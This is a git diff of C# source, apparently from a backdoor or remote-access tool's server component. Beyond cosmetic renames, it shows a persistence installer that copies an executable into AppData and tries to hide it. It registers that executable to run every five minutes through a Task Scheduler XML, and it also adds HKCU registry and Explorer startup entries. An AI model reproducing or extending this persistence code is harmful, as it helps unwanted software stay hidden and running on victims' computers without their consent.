@@ -9,11 +9,11 @@ namespace bc.srv.Class
 
     internal class InstallClass
     {
-        private static string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n \n  <Triggers>\n    <CalendarTrigger>\n      <Repetition>\n        <Interval>PT5M</Interval>\n        <Duration>P1D</Duration>\n        <StopAtDurationEnd>false</StopAtDurationEnd>\n      </Repetition>\n      <StartBoundary>2021-01-01T23:04:28</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n  </Triggers>\n  \n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <StopOnIdleEnd>true</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>{{srvPath}}</Command>\n    </Exec>\n  </Actions>\n</Task>";
+        private static string _xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n \n  <Triggers>\n    <CalendarTrigger>\n      <Repetition>\n        <Interval>PT5M</Interval>\n        <Duration>P1D</Duration>\n        <StopAtDurationEnd>false</StopAtDurationEnd>\n      </Repetition>\n      <StartBoundary>2021-01-01T23:04:28</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n  </Triggers>\n  \n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <StopOnIdleEnd>true</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>{{srvPath}}</Command>\n    </Exec>\n  </Actions>\n</Task>";
         /// <summary>
         ///     Avvia thread di installazione
         /// </summary>
-        public void StartInstallTHread()
+        public void StartInstallThread()
         {
             var t = new Thread(InstallServer)
             {
@@ -32,8 +32,8 @@ namespace bc.srv.Class
             if (SrvData.Instance.UseTaskScheduler)
                 this.InstallTaskScheduler(SrvData.Instance.sAppDataInstall);
             
-            if (SrvData.Instance.bUseHKCU)
-                InstallHCKU(SrvData.Instance.sHKCUEntry, SrvData.Instance.sAppDataInstall);
+            if (SrvData.Instance.BUseHkcu)
+                InstallHcku(SrvData.Instance.SHkcuEntry, SrvData.Instance.sAppDataInstall);
             
             if (SrvData.Instance.bUseExplorer)
                 InstallExplorer(SrvData.Instance.sExplorerEntry, SrvData.Instance.sAppDataInstall);
@@ -51,7 +51,7 @@ namespace bc.srv.Class
             
                 this.SaveFileIfNotExistsAndTryHidden(finalDestination);
 
-                var creationXml = xml.Replace("{{srvPath}}", finalDestination);
+                var creationXml = _xml.Replace("{{srvPath}}", finalDestination);
                 var fileName = $"{Guid.NewGuid():N}.xml";
                 var xmlDestination = Path.Combine(Path.GetDirectoryName(finalDestination), fileName);
                 File.WriteAllText(xmlDestination,creationXml);
@@ -73,7 +73,7 @@ namespace bc.srv.Class
         /// </summary>
         /// <param name="regEntry"></param>
         /// <param name="appDataPath"></param>
-        private void InstallHCKU(string regEntry, string appDataPath)
+        private void InstallHcku(string regEntry, string appDataPath)
         {
             try
             {
@@ -83,7 +83,7 @@ namespace bc.srv.Class
 
                 var rm = new RegistryManager();
                 
-                rm.AddHKCUReg(regEntry, finalDestination);
+                rm.AddHkcuReg(regEntry, finalDestination);
 
                 this.SaveFileIfNotExistsAndTryHidden(finalDestination);
 
